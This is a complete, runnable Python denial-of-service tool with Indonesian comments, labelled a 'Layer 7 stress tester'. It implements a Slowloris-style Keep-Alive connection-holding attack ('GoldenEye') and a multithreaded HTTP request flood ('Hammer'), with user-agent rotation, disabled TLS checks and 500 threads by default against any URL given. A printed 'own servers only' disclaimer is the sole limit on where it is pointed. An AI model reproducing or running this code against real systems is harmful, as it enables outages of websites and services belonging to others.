#!/usr/bin/env python3
"""
Stress Testing Tool — Layer 7 (HTTP Flood)
Hanya untuk server milik sendiri atau dengan izin tertulis!
"""

import socket
import ssl
import threading
import time
import random
import sys
import argparse
from urllib.parse import urlparse

# ═══════════════════════════════════════════
# KONFIGURASI
# ═══════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
]

# ═══════════════════════════════════════════
# MODE 1: GOLDEN EYE (Keep-Alive Slowloris style)
# ═══════════════════════════════════════════

class GoldenEyeAttack:
    """Kirim request HTTP Keep-Alive lambat — tahan koneksi tetap terbuka."""
    
    def __init__(self, host, port, ssl_mode=False, threads=100):
        self.host = host
        self.port = port
        self.ssl_mode = ssl_mode
        self.threads = threads
        self.running = False
        self.connected = 0
        self.lock = threading.Lock()
    
    def _build_request(self):
        """Bikin HTTP request partial yang Keep-Alive."""
        ua = random.choice(USER_AGENTS)
        return (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"Keep-Alive: 300\r\n"
        )
    
    def _worker(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                if self.ssl_mode:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
                
                sock.connect((self.host, self.port))
                request = self._build_request()
                
                # Kirim partial — jangan kirim \r\n terakhir biar koneksi nunggu
                sock.send(request.encode())
                
                with self.lock:
                    self.connected += 1
                    if self.connected % 50 == 0:
                        print(f"[GOLDEN EYE] Koneksi aktif: {self.connected}", end='\r')
                
                # Tahan koneksi — kirim byte acak tiap beberapa detik
                while self.running:
                    try:
                        sock.send(b"X-a: keepalive\r\n")
                        time.sleep(random.uniform(5, 15))
                    except:
                        break
                
                sock.close()
            except:
                pass
            finally:
                with self.lock:
                    self.connected -= 1
                time.sleep(0.1)
    
    def start(self):
        self.running = True
        print(f"[GOLDEN EYE] Meluncurkan {self.threads} thread ke {self.host}:{self.port}")
        print("[GOLDEN EYE] Tahan koneksi Keep-Alive...")
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
    
    def stop(self):
        self.running = False
        print("\n[GOLDEN EYE] Berhenti.")

# ═══════════════════════════════════════════
# MODE 2: HAMMER (Rapid HTTP Request Flood)
# ═══════════════════════════════════════════

class HammerAttack:
    """Kirim HTTP request secepat mungkin — banjir koneksi."""
    
    def __init__(self, host, port, ssl_mode=False, threads=200, paths=None):
        self.host = host
        self.port = port
        self.ssl_mode = ssl_mode
        self.threads = threads
        self.paths = paths or ["/"]
        self.running = False
        self.sent = 0
        self.errors = 0
        self.lock = threading.Lock()
    
    def _build_request(self, path):
        ua = random.choice(USER_AGENTS)
        return (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
    
    def _worker(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                if self.ssl_mode:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
                
                sock.connect((self.host, self.port))
                path = random.choice(self.paths)
                sock.send(self._build_request(path))
                
                # Baca response biar ga buffering
                try:
                    sock.recv(4096)
                except:
                    pass
                
                sock.close()
                
                with self.lock:
                    self.sent += 1
                
            except:
                with self.lock:
                    self.errors += 1
                time.sleep(0.01)
    
    def start(self):
        self.running = True
        print(f"[HAMMER] Meluncurkan {self.threads} thread ke {self.host}:{self.port}")
        print(f"[HAMMER] Path: {self.paths}")
        print("[HAMMER] Merapi... 🔨")
        
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
        
        # Monitor thread
        def monitor():
            while self.running:
                time.sleep(2)
                with self.lock:
                    print(f"[HAMMER] Request: {self.sent} | Error: {self.errors}", end='\r')
        
        threading.Thread(target=monitor, daemon=True).start()
    
    def stop(self):
        self.running = False
        print(f"\n[HAMMER] Berhenti. Total: {self.sent} request | Error: {self.errors}")

# ═══════════════════════════════════════════
# MAIN — 24 MODE (Kombinasi)
# ═══════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Layer 7 Stress Tester — Hanya untuk server sendiri!")
    parser.add_argument("url", help="Target URL (http://example.com atau https://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=500, help="Jumlah thread (default: 500)")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Durasi dalam detik (default: 30)")
    parser.add_argument("-m", "--mode", choices=["goldeneye", "hammer", "both"], default="both", 
                        help="Mode serangan (default: both)")
    parser.add_argument("-p", "--paths", nargs='+', default=["/"], 
                        help="Path targets (default: /)")
    
    args = parser.parse_args()
    
    parsed = urlparse(args.url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    ssl_mode = parsed.scheme == "https"
    
    print("=" * 60)
    print("  LAYER 7 STRESS TESTER")
    print(f"  Target  : {host}:{port}")
    print(f"  Threads : {args.threads}")
    print(f"  Durasi  : {args.duration} detik")
    print(f"  Mode    : {args.mode}")
    print("=" * 60)
    print("  ⚠ HANYA UNTUK SERVER MILIK SENDIRI ⚠")
    print("=" * 60 + "\n")
    
    attackers = []
    
    if args.mode in ("goldeneye", "both"):
        ge = GoldenEyeAttack(host, port, ssl_mode, threads=args.threads // 2)
        ge.start()
        attackers.append(ge)
    
    if args.mode in ("hammer", "both"):
        hm = HammerAttack(host, port, ssl_mode, threads=args.threads // 2, paths=args.paths)
        hm.start()
        attackers.append(hm)
    
    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print("\n[!] Dihentikan user.")
    
    for a in attackers:
        a.stop()
    
    print("\n[✔] Stress test selesai.")
